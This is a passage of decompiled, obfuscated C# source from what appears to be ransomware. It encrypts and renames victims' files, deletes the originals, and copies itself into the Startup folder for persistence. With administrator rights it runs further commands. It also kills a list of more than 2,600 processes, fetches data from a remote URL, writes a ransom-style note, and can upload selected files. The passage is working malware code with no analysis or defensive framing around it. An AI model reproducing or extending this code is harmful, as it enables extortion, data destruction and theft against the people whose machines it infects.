!CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367819)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367838)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367825)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367264)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().Contains(getString_0(107367247)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(IOVuiCuRiaYQ(getString_0(107367262))) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367205)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367224)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367175)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(MYWMPxbgtmbfTdO) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(getString_0(107367150)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(getString_0(107367145)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(getString_0(107367140)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(getString_0(107367167)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(getString_0(107367162)) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(wKJjmTiGCFwzP) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(TVaVFXxrZtbC) && !CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.Contains(MBSkjCFQIZSn))
			{
				if (xZtVzlbLhvULOy.Length != 0)
				{
					string[] array = xZtVzlbLhvULOy;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d81;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.EndsWith(MYWMPxbgtmbfTdO))
					{
						goto IL_0d81;
					}
				}
				catch (Exception)
				{
					goto IL_0d81;
				}
				if (!ojqyMmFKXxQzx.Contains(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ))
				{
					if (REuQhDHRFMt == getString_0(107396965))
					{
						try
						{
							if (sdnUYDgvtpPnO.KcNiwSfGbe(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ))
							{
								sdnUYDgvtpPnO.nVpvygjXPyvs(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
							}
						}
						catch
						{
						}
					}
					ojqyMmFKXxQzx.Add(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (IgsTsyCAVSNbiX)
							{
								Console.WriteLine(UjdWIsKCvIWmr.getString_0(107446936) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + UjdWIsKCvIWmr.getString_0(107446943) + new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length + UjdWIsKCvIWmr.getString_0(107447402));
								Console.WriteLine(UjdWIsKCvIWmr.getString_0(107447425), ojqyMmFKXxQzx.Count, LHsTakbnvLMZqfZlb, opDJfdSoJwBgd);
								Console.WriteLine(UjdWIsKCvIWmr.getString_0(107447368), wuIBqNhSkYrbJgK.Elapsed);
								Console.WriteLine(UjdWIsKCvIWmr.getString_0(107447311));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!JGpmykxMfw.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ)))
					{
						JGpmykxMfw.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ));
					}
					tFEmdOUcYrNKNamK(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length != 0L)
							{
								goto end_IL_0681;
							}
							goto end_IL_0681_2;
							end_IL_0681:;
						}
						catch (Exception ex2)
						{
							if (fKNptYRWsQNeZX)
							{
								try
								{
									File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + getString_0(107447052) + ex2.Message + getString_0(107396671));
								}
								catch (Exception)
								{
								}
							}
							opDJfdSoJwBgd++;
							goto end_IL_0681_2;
						}
						if (KfMEqDPrRPT == getString_0(107396965) && new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length > Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024)
						{
							try
							{
								if (MYWMPxbgtmbfTdO != getString_0(107365820))
								{
									if (pWNBRDgBMEak)
									{
										MYWMPxbgtmbfTdO = ACFERZKTAMdtw + MYWMPxbgtmbfTdO;
									}
									File.Move(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO);
								}
							}
							catch (Exception ex4)
							{
								if (fKNptYRWsQNeZX)
								{
									try
									{
										File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + getString_0(107446991) + ex4.Message + getString_0(107396671));
									}
									catch (Exception)
									{
									}
								}
								opDJfdSoJwBgd++;
								return;
							}
							if (MYWMPxbgtmbfTdO != getString_0(107365820))
							{
								CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ += MYWMPxbgtmbfTdO;
							}
							if (UyFfCzWWLzNEG == getString_0(107396965))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in PlfqlzQrkBHY)
									{
										if (CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qFRqtpZnzrSL.MYWMPxbgtmbfTdO) && rLaVjFwRdfLdr == UjdWIsKCvIWmr.getString_0(107396975))
										{
											if (Convert.ToInt32(KOFrqFvMUqLVa) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ).Length)
											{
												try
												{
													FZYQuTJPlcz.FdLmtwIxPaLAh(UjdWIsKCvIWmr.getString_0(107368878), UjdWIsKCvIWmr.getString_0(107368905), UjdWIsKCvIWmr.getString_0(107368892), CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ.ToLower().EndsWith(item) && rLaVjFwRdfLdr == UjdWIsKCvIWmr.getString_0(107396285))
										{
											try
											{
												FZYQuTJPlcz.FdLmtwIxPaLAh(UjdWIsKCvIWmr.getString_0(107368878), UjdWIsKCvIWmr.getString_0(107368905), UjdWIsKCvIWmr.getString_0(107368892), CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							string text = ZCphZGDWjyA.BFOtjpRBWToz(32);
							string s = nLZNnVxqRyDU.rfAqHmOOmjC(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (RPSmcrMfZxWv == getString_0(107396275))
							{
								byte[] array2 = null;
								byte[] byte_ = GWOsLqMwIb.WvcDKTbtliDrPF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, Convert.ToInt32(VwOPUhcZlsvZmR) * 1024 * 1024);
								GWOsLqMwIb.isjSvDiECOPp(PwpxQaHWCtbm: (!geKzJTCQWBdPJrv) ? (jHNjZakAkEHPd ? GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : GWOsLqMwIb.buNDQCFBoGJ(byte_, Encoding.ASCII.GetBytes(UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (jHNjZakAkEHPd ? COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : COuKIqToBmSj.ECpnJyWrmVTmlfT(byte_, Encoding.ASCII.GetBytes(UMxsSKxdLwMPg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), PFFKOkRvQq: CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, lsppjlmhfssIIIt: bytes);
							}
							else if (!jHNjZakAkEHPd)
							{
								mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, VwOPUhcZlsvZmR, UMxsSKxdLwMPg);
							}
							else
							{
								mVRsbcFAguJ.CbqbKQtEvSwyzLYaKI(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, VwOPUhcZlsvZmR, text, bytes);
							}
						}
						else
						{
							if (pWNBRDgBMEak)
							{
								MYWMPxbgtmbfTdO = ACFERZKTAMdtw + MYWMPxbgtmbfTdO;
							}
							string text2 = ZCphZGDWjyA.BFOtjpRBWToz(32);
							string s2 = nLZNnVxqRyDU.rfAqHmOOmjC(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (MYWMPxbgtmbfTdO != getString_0(107365820))
							{
								if (!ZKpCkvvrIixyBkk)
								{
									if (!jHNjZakAkEHPd)
									{
										VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
									}
									else
									{
										VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!jHNjZakAkEHPd)
										{
											HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, IWnUVTiJnjexACCr);
										}
										else
										{
											HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex6)
									{
										if (fKNptYRWsQNeZX)
										{
											try
											{
												File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + getString_0(107365774) + ex6.Message + getString_0(107396671));
											}
											catch (Exception)
											{
											}
										}
										opDJfdSoJwBgd++;
										return;
									}
								}
							}
							else if (!ZKpCkvvrIixyBkk)
							{
								if (!jHNjZakAkEHPd)
								{
									VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + getString_0(107365815), IWnUVTiJnjexACCr);
								}
								else
								{
									VLyxmOuvtqcVDJmc(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + getString_0(107365815), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!jHNjZakAkEHPd)
									{
										HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, IWnUVTiJnjexACCr);
									}
									else
									{
										HQqsRTFrfF(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex8)
								{
									if (fKNptYRWsQNeZX)
									{
										try
										{
											File.AppendAllText(TVaVFXxrZtbC, getString_0(107365518) + CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + getString_0(107365774) + ex8.Message + getString_0(107396671));
										}
										catch (Exception)
										{
										}
									}
									opDJfdSoJwBgd++;
									return;
								}
							}
							if (jHNjZakAkEHPd)
							{
								if (MYWMPxbgtmbfTdO != getString_0(107365820))
								{
									ZBrwuJMytAla(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ + MYWMPxbgtmbfTdO, bytes2);
								}
								else
								{
									ZBrwuJMytAla(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ, bytes2);
								}
							}
						}
						end_IL_0681_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d81;
			IL_0d81:
			sqQpQQcELGqIJWzCd.Remove(CS_0024_003C_003E8__locals0.ypXuEqFvQXPYZ);
		}

		static TajjcMGKxy()
		{
			Strings.CreateGetStringDelegate(typeof(TajjcMGKxy));
		}
	}

	private sealed class aOOnOAEMeWLf
	{
		public string KxsEjRtwYB;

		public string nvbZFFBLXADOA;

		public void _003CEncrypt2_003Eb__46()
		{
			while (true)
			{
				try
				{
					File.Delete(KxsEjRtwYB);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__47()
		{
			while (true)
			{
				try
				{
					if (File.Exists(nvbZFFBLXADOA))
					{
						File.Delete(nvbZFFBLXADOA);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string kFzbmJbQbZaZHkz;

	public static byte[] IWnUVTiJnjexACCr;

	public static string SGdiTvXzdcycb;

	public static string zCjFWNmzzORqwHz;

	public static List<string> FoHxVrzKsk;

	public static List<string> HAdcZZonckXNrA;

	public static string RwFshSEaCrYi;

	public static string UMxsSKxdLwMPg;

	public static string IdBmCgBFDzJuS;

	public static string rlCpcEJfqa;

	public static int dBCYPeUZqPCk;

	public static string REuQhDHRFMt;

	public static string zqQaaBwkjFY;

	public static string ayikziSNGVIUWoN;

	public static string ZIKygrMZbWsYlRS;

	public static string SmBjYePgOJlkai;

	public static string KkaQYWajqX;

	public static string XXjSrVedLdi;

	public static string giwadMcrrIYf;

	public static List<string> riONhoDxUW;

	public static List<string> JGpmykxMfw;

	public static string uXjfMSkaJzg;

	public static string KlxlmPvXLLFZ;

	public static string HvOLCEzZJtWnUd;

	public static List<string> ojqyMmFKXxQzx;

	public static string anjZHOfAxKdTwvsWK;

	private static string vAzGyuaypcRD;

	public static string wWAWZjvXYQSD;

	public static string lcjGAEybxEhtlc;

	public static List<string> DTecMDyuar;

	public static List<string> kaTfzyzEKr;

	public static List<string> xJpBolVCtSaaMGl;

	public static List<string> qGtrUSLzRTTZGp;

	public static string aJeonqeZxZjBYP;

	public static List<string> oaBCccgHDdJd;

	public static List<string> icaOPjdPYWz;

	public static string oLvOfyvKUaGGbe;

	public static string ShLKXLWXgnFS;

	internal static DateTime lvLyzrSdZWTvl;

	internal static DateTime RIuOTMlEmkOFp;

	public static string KfMEqDPrRPT;

	public static string VwOPUhcZlsvZmR;

	public static string QswmepBqskCzQp;

	public static string uGJVwqqCaIgV;

	public static string eIhiYKKqjghql;

	public static string EyuqCsqyzUlFrC;

	public static string pQdBrLzHnnmlBCib;

	public static string UyFfCzWWLzNEG;

	public static List<string> PlfqlzQrkBHY;

	public static string rLaVjFwRdfLdr;

	public static string KOFrqFvMUqLVa;

	public static string kNVvigmBlweOU;

	public static string MOygNsolRhkJe;

	public static string FEjtIQTdWPKq;

	public static string kRItCdOVRz;

	public static string SthzOntllxfA;

	public static string LDgIudiIYnqCR;

	public static string NXYcsEtzzwISc;

	public static string WjafbRcVrLBYmq;

	public static string ZUKimkoDnnjTL;

	public static string OOevMgLQSWPS;

	public static string EXIQNiPOzZeVrr;

	public static string dwDJlZMjFatuJC;

	public static string iMyPpHoxcDvKb;

	public static string OJTbTYigtwhLK;

	public static string IVSJCyvJyoM;

	public static string FvUkwYzFpYssaXTTm;

	public static string PdtBHCoVfJFK;

	public static string wKJjmTiGCFwzP;

	public static string PxbeNSeofeL;

	public static string LrysOkAIBno;

	public static string ALuUYkUNFV;

	public static string SnUyxrzkfX;

	public static string DlqNAdVPvtac;

	public static string dIQesMrbLpRzZUQ;

	public static string RPSmcrMfZxWv;

	public static string IHwEnwKHmUDVbo;

	public static string MINjWBEgMCN;

	public static string[] HrrdtvrqUAxN;

	public static string ObdFXRKnttrKo;

	public static bool geKzJTCQWBdPJrv;

	public static string WcZSwKmwveRmr;

	public static bool jHNjZakAkEHPd;

	public static bool XmcyFZznPVQg;

	public static bool QBgkrSBixAW;

	public static bool kqjAwtfZegDGvm;

	public static string TVaVFXxrZtbC;

	public static bool fKNptYRWsQNeZX;

	public static bool mHmqMmGdAKRlZCy;

	public static bool UBWmyKQOefd;

	public static bool eRHwMzVAUfqqx;

	public static bool ZKpCkvvrIixyBkk;

	public static string MBSkjCFQIZSn;

	public static bool IgsTsyCAVSNbiX;

	public static Stopwatch wuIBqNhSkYrbJgK;

	public static int opDJfdSoJwBgd;

	public static int LHsTakbnvLMZqfZlb;

	public static bool pWNBRDgBMEak;

	public static string ACFERZKTAMdtw;

	public static string[] CFiTuUySaVmkX;

	public static List<string> pCjGIjTYqWtfL;

	public static int tZrxRwzECkVmv;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	private static void Main(string[] args)
	{
		try
		{
			LQEDPqPJNHh CS_0024_003C_003E8__locals0 = new LQEDPqPJNHh();
			CS_0024_003C_003E8__locals0.sIVdwnmaEI = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.sIVdwnmaEI) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			xkXJlPfQWxiluT.YTIOKUmGzmuc(vAzGyuaypcRD);
		}
		catch (Exception)
		{
		}
		try
		{
			if (dIQesMrbLpRzZUQ == getString_0(107396947))
			{
				Thread thread = new Thread(NwtHHvzwlcayOek.QMpyIHnMMQaprO);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (ayikziSNGVIUWoN == getString_0(107396947))
		{
			Thread.Sleep(int.Parse(ZIKygrMZbWsYlRS));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && pQdBrLzHnnmlBCib == getString_0(107396947))
		{
			try
			{
				ACJsJWtSsMKe(IOVuiCuRiaYQ(getString_0(107396942)));
			}
			catch
			{
			}
		}
		try
		{
			if (XXjSrVedLdi == getString_0(107396947) && bPjdcvNiqj.cxRlBAOuPFQwesJ())
			{
				new oqjzKJtZwbr().GTTzroEFHh(bool_0: false);
				bPjdcvNiqj.iiqEcSVngNvIvS();
			}
		}
		catch (Exception)
		{
		}
		if (KlxlmPvXLLFZ == getString_0(107396947) && bPjdcvNiqj.cxRlBAOuPFQwesJ())
		{
			new oqjzKJtZwbr().GTTzroEFHh(bool_0: false);
			new oqjzKJtZwbr().BoirxYTJRZxQbKh();
		}
		if (zqQaaBwkjFY == getString_0(107396947))
		{
			ogoZMGBfNDbW.NnZkgOzuQIBsg();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396869);
			string text2 = text + Path.GetFileName(fileName);
			if (rlCpcEJfqa == getString_0(107396947) && fileName != text2)
			{
				Thread thread2 = new Thread(uyjdAvZMzLU);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (RwFshSEaCrYi == getString_0(107396947) && mainModule != null && fileName != text2)
			{
				try
				{
					dBCYPeUZqPCk = CHAbkxgtxTY(0, riONhoDxUW.Count);
					File.Copy(fileName, text + riONhoDxUW[dBCYPeUZqPCk], overwrite: true);
					Process.Start(text + riONhoDxUW[dBCYPeUZqPCk]);
					fFuUiPjGkyEIjnd();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (oLvOfyvKUaGGbe == getString_0(107396947) && DateTime.Now < lvLyzrSdZWTvl)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (ShLKXLWXgnFS == getString_0(107396947) && DateTime.Now > RIuOTMlEmkOFp)
			{
				fFuUiPjGkyEIjnd();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107396864);
			if (EXIQNiPOzZeVrr == getString_0(107396947))
			{
				Console.WriteLine(getString_0(107397206));
			}
			wuIBqNhSkYrbJgK.Start();
		}
		catch
		{
		}
		chqfCCbfakjSFN();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = kaTfzyzEKr;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						AbIKggCUlEtU(getString_0(107365223), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> source2 = xJpBolVCtSaaMGl;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365214)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (MINjWBEgMCN == getString_0(107396947))
				{
					string[] hrrdtvrqUAxN = HrrdtvrqUAxN;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365214)), getString_0(107365189) + string_0 + getString_0(107365148));
						};
					}
					Parallel.ForEach(hrrdtvrqUAxN, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!EyIUaktyBiAWZ().Contains(getString_0(107365878)))
				{
					jcTlrrZTvkVzl(aJeonqeZxZjBYP);
				}
				else
				{
					List<string> source3 = qGtrUSLzRTTZGp;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							AbIKggCUlEtU(IOVuiCuRiaYQ(HoxnFARxQnHppaC(getString_0(107365143))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source4 = oaBCccgHDdJd;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107365150)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source5 = icaOPjdPYWz;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						AbIKggCUlEtU(getString_0(107365133), string_0);
					};
				}
				Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && QBgkrSBixAW)
			{
				try
				{
					Thread thread4 = new Thread(VAuJfGZMbWiuS.gsJPfUMuUGBKFGv);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			AbIKggCUlEtU(getString_0(107397197), IOVuiCuRiaYQ(getString_0(107397184)));
			AbIKggCUlEtU(getString_0(107397197), IOVuiCuRiaYQ(getString_0(107397079)));
			AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107397054)), IOVuiCuRiaYQ(getString_0(107397009)));
			AbIKggCUlEtU(IOVuiCuRiaYQ(getString_0(107397054)), IOVuiCuRiaYQ(getString_0(107396367)));
		}
		SecureString secureString = new SecureString();
		if (QswmepBqskCzQp == getString_0(107396257))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			UMxsSKxdLwMPg = getString_0(107396220);
		}
		IdBmCgBFDzJuS = nLZNnVxqRyDU.rfAqHmOOmjC(yAXQiwwBLBX(secureString));
		if (LDgIudiIYnqCR == getString_0(107396947))
		{
			LKjYZqXbYTQ();
		}
		if (UBWmyKQOefd)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), MBSkjCFQIZSn)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), MBSkjCFQIZSn), string.Concat(IOVuiCuRiaYQ(getString_0(107396687)), new WebClient().DownloadString(IOVuiCuRiaYQ(getString_0(107396662))), getString_0(107396653), IOVuiCuRiaYQ(getString_0(107396648)), DateTime.Now, getString_0(107396653), IOVuiCuRiaYQ(getString_0(107396607)), IdBmCgBFDzJuS));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), MBSkjCFQIZSn), getString_0(107396550) + IdBmCgBFDzJuS);
				}
			}
			catch (Exception ex7)
			{
				if (fKNptYRWsQNeZX)
				{
					try
					{
						File.AppendAllText(TVaVFXxrZtbC, getString_0(107396521) + ex7.Message + getString_0(107396653));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		wsPOALIdynkr.FKVtGCDfHuhDiuhDV(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), wKJjmTiGCFwzP), WsSeaRlfxWeHq(IdBmCgBFDzJuS), null, null, getString_0(107395928), getString_0(107395943), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			kLIjkBBOiykLsfj();
		}
		try
		{
			vnuEeYRDwJUfr(new string[1] { getString_0(107395894) }, new string[2658]
			{
				getString_0(107395917),
				getString_0(107395912),
				getString_0(107395907),
				getString_0(107395902),
				getString_0(107395865),
				getString_0(107395860),
				getString_0(107395855),
				getString_0(107395882),
				getString_0(107395877),
				getString_0(107395872),
				getString_0(107395835),
				getString_0(107395830),
				getString_0(107395825),
				getString_0(107395852),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395805),
				getString_0(107395800),
				getString_0(107395791),
				getString_0(107395818),
				getString_0(107395813),
				getString_0(107395808),
				getString_0(107395767),
				getString_0(107395762),
				getString_0(107395789),
				getString_0(107395784),
				getString_0(107395779),
				getString_0(107395738),
				getString_0(107395733),
				getString_0(107395728),
				getString_0(107395755),
				getString_0(107395750),
				getString_0(107395745),
				getString_0(107395708),
				getString_0(107395699),
				getString_0(107395694),
				getString_0(107395721),
				getString_0(107395716),
				getString_0(107395711),
				getString_0(107396186),
				getString_0(107396181),
				getString_0(107396176),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107396157),
				getString_0(107396152),
				getString_0(107396147),
				getString_0(107396142),
				getString_0(107396165),
				getString_0(107396160),
				getString_0(107396123),
				getString_0(107396118),
				getString_0(107396113),
				getString_0(107396140),
				getString_0(107396135),
				getString_0(107396130),
				getString_0(107396093),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396106),
				getString_0(107396101),
				getString_0(107396060),
				getString_0(107396055),
				getString_0(107396050),
				getString_0(107396077),
				getString_0(107396072),
				getString_0(107396067),
				getString_0(107396062),
				getString_0(107396025),
				getString_0(107396020),
				getString_0(107396043),
				getString_0(107396034),
				getString_0(107395993),
				getString_0(107395984),
				getString_0(107396011),
				getString_0(107396006),
				getString_0(107396001),
				getString_0(107395964),
				getString_0(107395959),
				getString_0(107395414),
				getString_0(107395433),
				getString_0(107395384),
				getString_0(107395375),
				getString_0(107395402),
				getString_0(107395397),
				getString_0(107395392),
				getString_0(107395355),
				getString_0(107395350),
				getString_0(107395345),
				getString_0(107395372),
				getString_0(107395367),
				getString_0(107395358),
				getString_0(107395317),
				getString_0(107395340),
				getString_0(107395335),
